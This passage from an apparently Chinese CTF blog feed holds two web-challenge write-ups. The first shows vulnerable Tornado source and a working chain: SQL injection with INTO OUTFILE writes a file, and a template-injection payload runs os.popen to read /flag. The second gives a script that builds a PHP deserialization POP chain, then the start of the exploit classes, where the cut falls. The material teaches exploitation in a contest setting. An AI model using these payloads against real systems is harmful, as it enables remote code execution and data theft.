class="hljs-built_in">len</span>(results) != <span class="hljs-number">0</span>:<br>                self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>                conn.commit()<br>                conn.close()<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">try</span>:<br>            cursor.execute(<span class="hljs-string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])<br>            conn.commit()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            conn.rollback()<br>            conn.close()<br>            self.finish(<span class="hljs-string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogoutHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        self.clear_all_cookies()<br>        self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>            self.redirect(<span class="hljs-string">&#x27;/index.php&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        self.render(<span class="hljs-string">&#x27;admin.html&#x27;</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ImageHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        user = self.get_secure_cookie(<span class="hljs-string">&#x27;user&#x27;</span>)<br>        image_name = self.get_argument(<span class="hljs-string">&#x27;qwb_image_name&#x27;</span>, <span class="hljs-string">&#x27;header.jpeg&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> image_name:<br>            self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> user != <span class="hljs-string">b&#x27;admin&#x27;</span>:<br>                self.redirect(<span class="hljs-string">&#x27;/&#x27;</span>, permanent=<span class="hljs-literal">True</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> image_name.endswith(<span class="hljs-string">&#x27;.py&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> image_name <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> image_name:<br>                self.finish(<span class="hljs-string">&quot;nonono, you can&#x27;t read it.&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            image_name = os.path.join(os.getcwd() + <span class="hljs-string">&#x27;/image&#x27;</span>, image_name)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>                img = f.read()<br>            self.set_header(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br>            self.finish(img)<br>            <span class="hljs-keyword">return</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecretHandler</span>(<span class="hljs-params">tornado.web.RequestHandler</span>):</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tornado.web.RequestHandler._template_loaders):<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br>        msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br>        self.render(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>)<br>        <span class="hljs-keyword">if</span> tornado.web.RequestHandler._template_loaders:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tornado.web.RequestHandler._template_loaders:<br>                tornado.web.RequestHandler._template_loaders[i].reset()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_app</span>():</span><br>    <span class="hljs-keyword">return</span> tornado.web.Application([<br>     (<br>      <span class="hljs-string">&#x27;/index.php&#x27;</span>, MainHandler),<br>     (<br>      <span class="hljs-string">&#x27;/login.php&#x27;</span>, LoginHandler),<br>     (<br>      <span class="hljs-string">&#x27;/logout.php&#x27;</span>, LogoutHandler),<br>     (<br>      <span class="hljs-string">&#x27;/register.php&#x27;</span>, RegisterHandler),<br>     (<br>      <span class="hljs-string">&#x27;/admin.php&#x27;</span>, AdminHandler),<br>     (<br>      <span class="hljs-string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),<br>     (<br>      <span class="hljs-string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),<br>     (<br>      <span class="hljs-string">&#x27;/&#x27;</span>, MainHandler)], **settings)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app = make_app()<br>    app.listen(<span class="hljs-number">8000</span>)<br>    tornado.ioloop.IOLoop.current().start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>具体漏洞出现在</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">msg = self.get_argument(<span class="hljs-string">&#x27;congratulations&#x27;</span>, <span class="hljs-string">&#x27;oh! you find it&#x27;</span>)<br>        bans = []<br>        <span class="hljs-keyword">for</span> ban <span class="hljs-keyword">in</span> bans:<br>            <span class="hljs-keyword">if</span> ban <span class="hljs-keyword">in</span> msg:<br>                self.finish(<span class="hljs-string">&#x27;bad hack,go out!&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;congratulations.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(<span class="hljs-string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)<br>            f.flush()<br></code></pre></div></td></tr></table></figure><p>接受了一个<code>congratulations</code>参数，明显的是SSTI模板注入</p><p>得到源码后,过滤了<code>&#123;&#123;&#125;&#125;</code>标签，那么我们可用的只有<code>&#123;%%&#125;</code>标签，而剩下的操作名中，有一个操作是比较危险的，那就是extends操作，它的参数为一个文件名，该文件将会被作为模板文件被包含，并被渲染。那么如果我们包含一个带有恶意SSTI的payload的字符串的文件，那么是可以执行该SSTI的payload的。因此我们现在需要往服务器上上传一个恶意文件。</p><p>如何往服务器上上传文件呢.根据前文信息，我们可以得知该python应用为mysql用户权限启动，那么我们可以直接考虑通过mysql的<code>into outfile</code>语句写文件。这里分为两步，首先是往数据库里写东西，这个可以直接通过注册功能实现，第二步是将数据库里的数据导出至文件，在mysql中默认导出目录为<code>/var/lib/mysql-files/</code>，其他目录是没有导出权限的，因此我们将文件导出至该文件夹。<br>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">/register.php?username=guoke&amp;password=&#123;% set <span class="hljs-keyword">return</span> __import__(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;cat  /flag&quot;</span>).read()%&#125;<br>/register.php?username=guoke<span class="hljs-string">&#x27; into outfile &#x27;</span>/<span class="hljs-keyword">var</span>/lib/mysql-files/guoke&amp;password=<span class="hljs-number">123</span><br>/good_job_my_ctfer.php?congratulations=&#123;% <span class="hljs-keyword">extends</span> /<span class="hljs-keyword">var</span>/lib/mysql-files/guoke%&#125;<br><br></code></pre></div></td></tr></table></figure><p>最后得到flag<br><img src="https://img-blog.csdnimg.cn/20210717222121119.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网被-popmaster</title>
    <link href="/2021/07/14/2021-7-14-popmaster/"/>
    <url>/2021/07/14/2021-7-14-popmaster/</url>
    
    <content type="html"><![CDATA[<h2 id="popmaster"><a href="#popmaster" class="headerlink" title="popmaster"></a>popmaster</h2><p>exp如下(node为节点)：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> nose<br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span>  make_parser<br><span class="hljs-keyword">from</span>  phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pprint<br>parser = make_parser() <br>func_name = <span class="hljs-string">&quot;BFda7w&quot;</span><br>con = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\popmaster.php&quot;</span>).read()<br>lexer = phplex.lexer.clone()<br>lexer.filename = <span class="hljs-literal">None</span><br>output = parser.parse(con, lexer=lexer) <span class="hljs-comment">#输出抽象语法树</span><br>functions = &#123;&#125;<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> out <span class="hljs-keyword">in</span> output:<br>    class_name = out.name<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> out.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            functions[node.name] = out<br>target = functions[func_name]<br><span class="hljs-comment"># print(target)</span><br><span class="hljs-comment"># 强赋值函数直接跳过</span><br><br>skip_func = [<span class="hljs-string">&quot;F03wGk&quot;</span>, <span class="hljs-string">&quot;c3BsKT&quot;</span> ,<span class="hljs-string">&quot;C2S8YY&quot;</span> ,<span class="hljs-string">&quot;g5uQo2&quot;</span> ,<span class="hljs-string">&quot;mdNq2Z&quot;</span> ,<span class="hljs-string">&quot;CpBMKR&quot;</span> ,<span class="hljs-string">&quot;xYClcr&quot;</span>,<span class="hljs-string">&quot;RhTsLz&quot;</span>,<span class="hljs-string">&quot;rivyS9&quot;</span>,<span class="hljs-string">&quot;sIm1Q9&quot;</span>,<span class="hljs-string">&quot;qMKDLp&quot;</span>,<span class="hljs-string">&quot;dgkACH&quot;</span>,<span class="hljs-string">&quot;wWVqKa&quot;</span>]<span class="hljs-comment">#这个地方需要自己测试找出来不符合的函数</span><br><br>pop_chain = []<br>pop_chain.append(func_name)<br>e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            <span class="hljs-keyword">if</span> node.name == func_name:<br>                <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br>                            <span class="hljs-keyword">continue</span><br>                        target = functions[subnode.name]<br>                        func_name = subnode.name<br>                        pop_chain.append(func_name)<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br>                        <span class="hljs-comment"># print(subnode.node.name)</span><br>                            <span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br>                                <span class="hljs-keyword">continue</span><br>                            target = functions[subnode.node.name]<br>                            func_name = subnode.node.name<br>                            pop_chain.append(func_name)<br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(subnode) == Eval):<br>                        e = <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(pop_chain)<br><span class="hljs-comment"># pop_chain = [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;yv2r6Y&#x27;, &#x27;Nq02C8&#x27;]</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br>            <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br>                     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> + functions[pop_chain[i + <span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;rivyS9&#x27;, &#x27;mdNq2Z&#x27;, &#x27;LHl965&#x27;, &#x27;E0eLx8&#x27;, &#x27;DuLIOe&#x27;, &#x27;WCe4Tq&#x27;, &#x27;TmAYUb&#x27;, &#x27;LAekG5&#x27;, &#x27;r2q0UF&#x27;, &#x27;C2S8YY&#x27;, &#x27;g5uQo2&#x27;,</span><br><span class="hljs-comment">#  &#x27;KxPhgA&#x27;, &#x27;lsA527&#x27;, &#x27;LRu117&#x27;, &#x27;MFpxq9&#x27;, &#x27;xafXFm&#x27;, &#x27;GsVAVW&#x27;, &#x27;dGcfBB&#x27;, &#x27;YY6r37&#x27;, &#x27;gH4fYy&#x27;, &#x27;U6xl6Q&#x27;, &#x27;eRt60t&#x27;]</span><br><span class="hljs-comment"># F03wGk c3BsKT C2S8YY g5uQo2 mdNq2Z CpBMKR xYClcr rivyS9 sIm1Q9</span><br><span class="hljs-comment"># qMKDLp dgkACH</span><br><span class="hljs-comment"># qqhftt qMKDLp  M7qPV2 dgkACH xG4zKc</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;,</span><br><span class="hljs-comment">#  &#x27;dgkACH&#x27;, &#x27;S8CRbp&#x27;, &#x27;g0Evp1&#x27;, &#x27;FZp1N3&#x27;, &#x27;xkFzHK&#x27;, &#x27;gcVOmb&#x27;, &#x27;ozDZgT&#x27;, &#x27;gHWISY&#x27;, &#x27;c7rQmp&#x27;, &#x27;HwiCXY&#x27;, &#x27;OfIYHw&#x27;, &#x27;foTwm3&#x27;]</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;wWVqKa&#x27;, &#x27;qM2mnx&#x27;]</span><br><br><br></code></pre></div></td></tr></table></figure><p>得到pop链，构造payload打</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPmYmu</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$qfDgtGD</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;qfDgtGD= <span class="hljs-keyword">new</span> z3w6kL();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">z3w6kL</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$X5XSpPz</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;X5XSpPz= <span class="hljs-keyword">new</span> olTmkb();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">olTmkb</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$tTEiXpd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;tTEiXpd= <span class="hljs-keyword">new</span> Moag8l();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moag8l</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$D8ea5Xn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;D8ea5Xn= <span class="hljs-keyword">new</span> QcHqVE();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QcHqVE</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XHhuV4y</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XHhuV4y= <span class="hljs-keyword">new</span> hCG6ag();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hCG6ag</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cYnq47g</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;cYnq47g= <span class="hljs-keyword">new</span> EYyxSm();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EYyxSm</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$A7icng3</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;A7icng3= <span class="hljs-keyword">new</span> CDF5aP();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CDF5aP</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$KUxwPnq</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;KUxwPnq= <span class="hljs-keyword">new</span> a1rktQ();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 